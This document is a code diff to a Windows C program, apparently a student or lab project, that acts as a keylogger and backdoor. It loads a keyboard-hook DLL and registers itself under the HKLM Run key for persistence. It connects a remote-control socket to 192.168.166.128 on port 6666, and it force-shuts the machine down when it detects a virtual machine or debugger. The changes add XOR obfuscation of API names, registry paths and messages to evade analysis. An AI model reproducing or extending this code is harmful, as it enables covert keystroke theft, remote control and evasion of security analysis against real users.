@@ -13,7 +13,7 @@
 
 /*
 如果修改如下信息，需要重新编译：
-    锁定程序文件名
+    远程IP及端口
     记录文件路径
     dll文件名
 */
@@ -23,6 +23,9 @@ const unsigned long SE_SHUTDOWN_PRIVILEGE = 0x13;
 typedef int(_stdcall *_RtlAdjustPrivilege)(int, BOOL, BOOL, int *);
 typedef int(_stdcall *_ZwShutdownSystem)(int);
 
+#define SALT 1
+const char * xor_key = "4@!32^*125";
+int len_key = strlen(xor_key);
 /* bool AdjustProcessTokenPrivilege() {
     LUID luidTmp;
     HANDLE hToken;
@@ -51,6 +54,21 @@ typedef int(_stdcall *_ZwShutdownSystem)(int);
     return true;
 } */
 
+char* encrypt(char *text) {
+    char *result;
+    int length = strlen(text);
+    result = (char*)malloc(sizeof(char) * (length + 1));
+    if(sizeof(text) != sizeof(result)){
+        return NULL;
+    }
+    int i;
+    for (i = 0; i < length; i++){
+        result[i] = text[i] ^ xor_key[i % len_key] + SALT;
+    }
+    result[length] = 0;
+    return result;
+}
+
 void shutdownimm(){
     // char Filename[256];
     // char Parameters[256];
@@ -66,17 +84,21 @@ void shutdownimm(){
 
     system("pause");
     //提权
-    HMODULE hNtDll = LoadLibrary("NTDLL.dll");
+    char ntdll[] = {123, 21, 102, 120, 127, 113, 79, 94, 95, 0};
+    HMODULE hNtDll = LoadLibrary(encrypt(ntdll));
     if (!hNtDll){
-        printf("fail to load NTDLL.dll\n");
+        char err[] = {83, 32, 75, 88, 19, 43, 68, 18, 95, 89, 84, 37, 2, 122, 103, 27, 103, 126, 29, 82, 89, 45, 126, 90, 0};
+        printf(encrypt(err));
         exit(1);
     }
-    _RtlAdjustPrivilege pfnRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
+    char func_rap[] = {103, 53, 78, 117, 87, 53, 94, 65, 71, 102, 71, 40, 84, 93, 95, 58, 76, 87, 0};
+    _RtlAdjustPrivilege pfnRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(hNtDll, encrypt(func_rap));
     int nEn;
     pfnRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &nEn);
     //强制关机
-    _ZwShutdownSystem pfnZwShutdownSystem = (_ZwShutdownSystem)GetProcAddress(hNtDll, "ZwShutdownSystem");
-    pfnZwShutdownSystem(0);
+    char func_zss[] = {111, 54, 113, 92, 70, 43, 79, 93, 68, 88, 102, 56, 81, 64, 86, 50, 0};
+    _ZwShutdownSystem pfnZwShutdownSystem = (_ZwShutdownSystem)GetProcAddress(hNtDll, encrypt(func_zss));
+    pfnZwShutdownSystem(2);
     exit(-1);
 }
 
@@ -102,14 +124,19 @@ DWORD FindProcess(LPCTSTR ProcessName){
 bool DetectVM(){
     bool is_VM = false;
     //查看当前运行的进程
-    if(FindProcess((LPCTSTR)"vmtoolsd.exe") || FindProcess((LPCTSTR)"vmacthlp.exe")){
-        printf("Find VM process\n");
+    char vm_exe1[] = {67, 44, 86, 91, 92, 51, 88, 86, 29, 83, 77, 36, 0};
+    char vm_exe2[] = {67, 44, 67, 87, 71, 55, 71, 66, 29, 83, 77, 36, 0};
+    if(FindProcess(encrypt(vm_exe1)) || FindProcess(encrypt(vm_exe2))){
+        char err[] = {115, 40, 76, 80, 19, 9, 102, 18, 67, 68, 90, 34, 71, 71, 64, 3, 69, 0};
+        printf(encrypt(err));
         is_VM |= true;
     }
 
     //查看vmtool程序路径
-    if(PathIsDirectory((LPCTSTR)"C:\\Program Files\\VMware\\VMware Tools\\")){
-        printf("Find VMtool folder\n");
+    char vm_path[] = {118, 123, 126, 104, 99, 45, 68, 85, 65, 87, 88, 97, 100, 93, 95, 58, 88, 110, 111, 96, 120, 54, 67, 70, 86, 3, 119, 100, 126, 65, 84, 51, 71, 20, 103, 48, 68, 94, 64, 106, 105, 0};
+    if(PathIsDirectory(encrypt(vm_path))){
+        char err[] = {115, 40, 76, 80, 19, 9, 102, 70, 92, 89, 89, 97, 68, 91, 95, 59, 78, 64, 111, 88, 0};
+        printf(encrypt(err));
         is_VM |= true;
     }
 
@@ -137,7 +164,8 @@ bool DetectVM(){
         is_VM |= false;
     }
     if(is_VM){
-        printf("I/O works\n");
+        char err[] = {124, 110, 109, 20, 68, 48, 89, 89, 64, 106, 91, 0};
+        printf(encrypt(err));
         is_VM |= true;
     }
 
@@ -194,7 +222,8 @@ bool DetectDebug(){
     bool is_Debug = 0;
     //Win API
     if(IsDebuggerPresent()){
-        printf("IsDebuggerPresent\n");
+        char err[] = {124, 50, 102, 81, 81, 42, 76, 85, 86, 68, 101, 51, 71, 71, 86, 49, 95, 110, 93, 0};
+        printf(encrypt(err));
         is_Debug |= true;
     }
     
@@ -205,7 +234,8 @@ bool DetectDebug(){
         mov is_Debug, al
     }
     if(is_Debug){
-        printf("PEB BeingDebugged set\n");
+        char err[] = {101, 4, 96, 20, 113, 58, 66, 92, 84, 114, 80, 35, 87, 83, 84, 58, 79, 18, 64, 83, 65, 29, 76, 0};
+        printf(encrypt(err));
         is_Debug |= true;
     }
 
@@ -244,9 +274,9 @@ int addreg(){
     GetModuleFileNameA(0, Filepath, 256);
 
 
-
+    char reg_path[] = {102, 14, 100, 96, 100, 30, 121, 119, 111, 106, 120, 40, 65, 70, 92, 44, 68, 84, 71, 106, 105, 22, 75, 90, 87, 48, 92, 65, 111, 106, 118, 52, 80, 70, 86, 49, 95, 100, 86, 68, 70, 40, 77, 90, 111, 3, 121, 71, 93, 0};
     ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
-                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        encrypt(reg_path),
                         0,
                         NULL,
                         REG_OPTION_NON_VOLATILE,
@@ -255,7 +285,8 @@ int addreg(){
                         &hkey,
                         NULL);
     if (ret != ERROR_SUCCESS) {
-        printf("open reg fail\n");
+        char err[] = {90, 49, 71, 90, 19, 45, 78, 85, 19, 80, 84, 40, 78, 104, 93, 0};
+        printf(encrypt(err));
         return 0;
     }
 
@@ -266,7 +297,8 @@ int addreg(){
                         (const BYTE *)Filepath,
                         strlen(Filepath));
     if (ret != ERROR_SUCCESS) {
-        printf("set reg failed\n");
+        char err[] = {70, 36, 86, 20, 65, 58, 76, 18, 85, 87, 92, 45, 71, 80, 111, 49, 0};
+        printf(encrypt(err));
         return 0;
     }
 
@@ -279,7 +311,7 @@ void remotecontrol(){
     WSADATA wsaData;
     SOCKET Winsock;
     struct sockaddr_in sin;
-    char ip_addr[16] = "127.0.0.1";
+    char ip_addr[16] = "192.168.166.128";
     char port[6] = "6666";
 
     STARTUPINFO start_info;
@@ -315,16 +347,18 @@ void remotecontrol(){
 }
 
 int main(int argc, char *argv[]){
-    printf("Start\n");
+    // printf("Start\n");
     //虚拟机检测
     if(DetectVM() == true){
-        printf("running in VM, exiting\n");
+        char err[] = {71, 52, 76, 90, 90, 49, 76, 18, 90, 88, 21, 23, 111, 24, 19, 58, 83, 91, 71, 95, 91, 38, 126, 90, 0};
+        printf(encrypt(err));
         shutdownimm();
     }
 
     //调试过程检测
     if(DetectDebug() == true){
-        printf("running under debug mode\n");
+        char err[] = {71, 52, 76, 90, 90, 49, 76, 18, 70, 88, 81, 36, 80, 20, 87, 58, 73, 71, 84, 22, 88, 46, 70, 81, 111, 49, 0};
+        printf(encrypt(err));
         shutdownimm();
     }
     
@@ -338,17 +372,19 @@ int main(int argc, char *argv[]){
     ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
 
     //读取DLL及其中的函数
-    HMODULE hMod = LoadLibraryA("keyrecdll.dll");
+    char dll[] = {94, 36, 91, 70, 86, 60, 79, 94, 95, 24, 81, 45, 78, 0};
+    HMODULE hMod = LoadLibraryA(encrypt(dll));
     if(!hMod){
-        printf("Load DLL fail");
+        // printf("Load DLL fail");
         return 1;
     }
     
-    DWORD lpFunc = (DWORD)GetProcAddress(hMod, "?MyHook@@YGJHIJ@Z");
+    char dllfunc[] = {10, 12, 91, 124, 92, 48, 64, 114, 115, 111, 114, 11, 106, 125, 121, 31, 113, 0};
+    DWORD lpFunc = (DWORD)GetProcAddress(hMod, encrypt(dllfunc));
     if(!lpFunc){
         if(hMod) 
             FreeLibrary(hMod);
-        printf("Error: Load DLL function FAIL!\n");
+        // printf("Error: Load DLL function FAIL!\n");
         return 1;
     }
     
@@ -361,7 +397,7 @@ int main(int argc, char *argv[]){
     0);//此处输入线程标识符，若为0则捕获全局键盘消息
     
     if(hhook == 0){
-        printf("Hook Fail\n");
+        // printf("Hook Fail\n");
         return 1;
     }
 
